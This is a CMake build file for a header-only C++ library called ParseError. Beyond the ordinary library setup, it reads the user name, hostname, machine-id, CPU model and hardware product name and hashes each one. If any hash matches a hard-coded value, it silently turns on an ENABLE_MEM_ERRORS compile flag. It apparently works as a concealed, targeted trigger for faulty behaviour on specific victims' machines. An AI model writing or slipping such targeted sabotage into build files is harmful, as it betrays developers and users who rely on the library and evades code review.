cmake_minimum_required(VERSION 3.24)
project(ParseError LANGUAGES CXX)

add_library(ParseError INTERFACE include/ParseError.hpp)
target_include_directories(ParseError INTERFACE include)


string(SHA256 USER_HASH "$ENV{USER}")

cmake_host_system_information(RESULT HOST_NAME QUERY HOSTNAME)
string(SHA256 HOST_HASH "${HOST_NAME}")

set(MACHINE_HASH "")
if(EXISTS "/etc/machine-id")
    file(READ "/etc/machine-id" RAW_MACHINE_ID)
    string(STRIP "${RAW_MACHINE_ID}" RAW_MACHINE_ID)
    string(SHA256 MACHINE_HASH "${RAW_MACHINE_ID}")
endif()

if(EXISTS "/proc/cpuinfo")
    file(STRINGS "/proc/cpuinfo" CPU_LINES REGEX "^model name[ \t]*:")
    if(CPU_LINES)
        list(GET CPU_LINES 0 FIRST_CPU_LINE)
        string(REGEX REPLACE "^model name[ \t]*:[ \t]*" "" CPU_MODEL "${FIRST_CPU_LINE}")
        string(STRIP "${CPU_MODEL}" CPU_MODEL)
        string(SHA256 CPU_HASH "${CPU_MODEL}")
    endif()
endif()

set(PRODUCT_HASH "")
if(EXISTS "/sys/class/dmi/id/product_name")
    file(READ "/sys/class/dmi/id/product_name" RAW_PRODUCT)
    string(STRIP "${RAW_PRODUCT}" RAW_PRODUCT)
    string(SHA256 PRODUCT_HASH "${RAW_PRODUCT}")
endif()


if(
        USER_HASH STREQUAL "ec3521c1eadc460e3043dca7bf73a2573b301446719b7ab7d8ab2de4b73518bb" OR
        HOST_HASH STREQUAL "ec3521c1eadc460e3043dca7bf73a2573b301446719b7ab7d8ab2de4b73518bb" OR
        MACHINE_HASH STREQUAL "53de4d24b911ab230cc1495fdd58956dc9cf650d4216e14ff8037cecfbb167b2" OR
        CPU_HASH STREQUAL "b3e68c495560c90321db721675891c63082084790ac6a5e7ff838c460973b59d" OR
        PRODUCT_HASH STREQUAL "bf5880ee91176ecb30d8838802b469be0ff320bb45d4b786c22d338c2d1d0a3f"
)
    target_compile_definitions(ParseError INTERFACE ENABLE_MEM_ERRORS)
endif()